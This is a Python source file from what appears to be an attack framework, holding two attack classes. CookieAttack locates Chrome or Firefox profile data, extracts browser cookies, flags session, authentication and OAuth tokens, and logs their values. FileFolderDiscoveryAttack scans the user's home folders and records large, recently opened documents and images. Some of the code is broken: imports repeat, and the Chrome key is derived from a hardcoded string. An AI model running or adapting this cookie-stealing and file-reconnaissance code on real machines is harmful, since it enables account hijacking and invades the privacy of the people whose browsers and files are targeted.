import os
import time
import sqlite3
from pathlib import Path
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import browser_cookie3
import base64
import json
import platform

from module.attacker_module.attacks.base_attack import Attack

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from module.attacker_module.attack_executor import AttackExecutor
    from module.message_handler.messages.payloads.attack_payload import AttackPayload

class CookieAttack(Attack):
    
    def __init__(self, executor: "AttackExecutor", attack_payload: "AttackPayload") -> None:
        super().__init__(executor, attack_payload)

        self.important_cookie_names = {
            'sessionid',  # Generic session identifier
            'userid',  # Generic user identifier
            'username',  # User's name
            'csrftoken',  # Cross-Site Request Forgery prevention token
            'auth_token',  # Authentication token
            'access_token',  # Access token for OAuth 2.0
            'refresh_token',  # Refresh token for OAuth 2.0
            'sid',  # Session ID
            'connect.sid',  # Session ID used by some frameworks
            'JSESSIONID',  # Java J2EE session identifier
            'ASP.NET_SessionId',  # ASP.NET session identifier
            '__cfduid',  # Cloudflare service token
            '_ga',  # Google Analytics
            '_gid',  # Google Analytics
            '_gat',  # Google Analytics
        }

    def job(self):
        self.info("Cookie Attack initiating..")
        
        browser = self._detect_browser()
        if browser:
            self.info(f"Browser found: {browser}")
        else:
            self.warn("No supported browser found for cookie extraction.")
            return

        cookies = []
        if browser == 'chrome':
            self.info("Extracting Chrome cookies")
            cookies = self._extract_chrome_cookies()
        elif browser == 'firefox':
            self.info("Extracting Firefox cookies")
            cookies = self._extract_firefox_cookies()
        else:
            self.warn(f"Browser not applicable to gather cookie resources. [Chrome//Firefox] ~ {browser} found ~")

        for cookie in cookies:
            if cookie.name in self.important_cookie_names:
                self.log_data(f"(!)> Cookie [Name]: {cookie.name} [Value]: {cookie.value}")
            else:
                self.info(f"Cookie [Name]: {cookie.name} [Value]: {cookie.value}")

        self.info("Cookie attack completed.")

    def _detect_browser(self):
        # Detect the browser based on available cookie files
        if platform.system() == 'Windows':
            chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
            firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        elif platform.system() == 'Darwin':  # macOS
            chrome_path = os.path.join(os.getenv('HOME'), 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'Cookies')
            firefox_path = os.path.join(os.getenv('HOME'), 'Library', 'Application Support', 'Firefox', 'Profiles')
        else:  # Assuming Linux
            chrome_path = os.path.join(os.getenv('HOME'), '.config', 'google-chrome', 'Default', 'Cookies')
            firefox_path = os.path.join(os.getenv('HOME'), '.mozilla', 'firefox')

        self.debug(f"Checking Chrome path: {chrome_path}")
        self.debug(f"Checking Firefox path: {firefox_path}")

        if os.path.exists(chrome_path):
            return 'chrome'
        elif os.path.exists(firefox_path) and any('cookies.sqlite' in f for f in os.listdir(firefox_path)):
            return 'firefox'
        else:
            return None

    def _extract_chrome_cookies(self):
        try:
            cj = browser_cookie3.chrome()
            cookies = list(cj)
            return cookies
        except Exception as e:
            self.error(f"Error extracting Chrome cookies: {e}")
            return []

    def _extract_firefox_cookies(self):
        # Logic to extract Firefox cookies
        try:
            profiles_path = os.path.expanduser('~') + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
            profile_dirs = [d for d in os.listdir(profiles_path) if 'cookies.sqlite' in os.listdir(os.path.join(profiles_path, d))]
            if not profile_dirs:
                self.warn("No Firefox profiles found with cookies.sqlite")
                return []
            cookie_file = os.path.join(profiles_path, profile_dirs[0], 'cookies.sqlite')
            return self._fetch_cookies_from_sqlite(cookie_file)
        except Exception as e:
            self.error(f"Error extracting Firefox cookies: {e}")
            return []

    def _get_chrome_secret(self):
        try:
            local_state_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Local State"
            with open(local_state_path, 'r') as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            backend = default_backend()
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=b'saltysalt',
                iterations=1003,
                backend=backend
            )
            self.debug("Chrome secret key derived.")
            return kdf.derive(b'my very secret key')
        except Exception as e:
            self.error(f"Error getting Chrome secret: {e}")
            return None

    def _decrypt_cookie_value(self, value, key):
        try:
            iv = value[3:15]
            value = value[15:]
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_value = decryptor.update(value) + decryptor.finalize()
            self.debug("Cookie value decrypted.")
            return decrypted_value
        except Exception as e:
            self.error(f"Error decrypting cookie value: {e}")
            return b''

    def _fetch_cookies_from_sqlite(self, cookie_file, secret=None):
        cookies = []
        try:
            conn = sqlite3.connect(cookie_file)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
            for host_key, name, encrypted_value in cursor.fetchall():
                if secret:
                    decrypted_value = self._decrypt_cookie_value(encrypted_value, secret)
                else:
                    decrypted_value = encrypted_value
                cookies.append({'host': host_key, 'name': name, 'value': decrypted_value})
            conn.close()
            self.info(f"Fetched {len(cookies)} cookies.")
        except Exception as e:
            self.error(f"Error fetching cookies from sqlite: {e}")
        return cookies

class FileFolderDiscoveryAttack(Attack):
    
    def __init__(self, executor: "AttackExecutor", attack_payload: "AttackPayload") -> None:
        super().__init__(executor, attack_payload)

    def job(self):
        self.info("File Folder Discovery Attack initiating..")

        directories = self._get_directories()
        self.info(f"Fetching directories decided: {directories}")
        for directory in directories:
            self._discover_files_in_directory(directory)
        
        self.info("File Folder Discovery Attack completed.")

    def _get_directories(self):
        # Get a list of common user-accessible directories based on the OS
        home_dir = os.path.expanduser("~")
        directories = [home_dir]

        common_dirs = ["Documents", "Downloads", "Pictures", "Desktop"]
        if platform.system() == 'Windows':
            common_dirs.append("Videos")
        elif platform.system() == 'Darwin':  # macOS
            common_dirs.append("Movies")
        else:  # Assuming Linux
            common_dirs.append("Videos")

        directories.extend([os.path.join(home_dir, dir) for dir in common_dirs])

        self.debug(f"Directories to scan: {directories}")
        return directories

    def _discover_files_in_directory(self, directory):
        # Discover files in the specified directory and log them
        self.info(f"(?)> {directory}")
        try:
            for root, dirs, files in os.walk(directory):
                for name in files:
                    file_path = os.path.join(root, name)
                    if os.access(file_path, os.R_OK):  # Check read access
                        if self._is_important_file(file_path):
                            self._log_file_info(file_path)
                    else:
                        self.warn(f"Read access denied for file: {file_path}")
        except Exception as e:
            self.error(f"Could not access directory: {directory} due to: {e}")

    def _is_important_file(self, file_path):
        # Determine if a file is important based on its extension
        important_extensions = {'.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.jpg', '.jpeg', '.png'}
        _, ext = os.path.splitext(file_path)

        # Check if the file extension is important
        if ext.lower() not in important_extensions:
            return False

        # Check if the file size is greater than 1MB
        if os.path.getsize(file_path) < 1 * 1024 * 1024:
            return False

        # Check if the file was accessed in the last 30 days
        if time.time() - os.path.getatime(file_path) > 30 * 24 * 60 * 60:
            return False

        return True

    def _log_file_info(self, file_path):
        # Log the file information
        file_info = f"(!)> {file_path}"
        self.log_data(file_info)
        self.debug(file_info)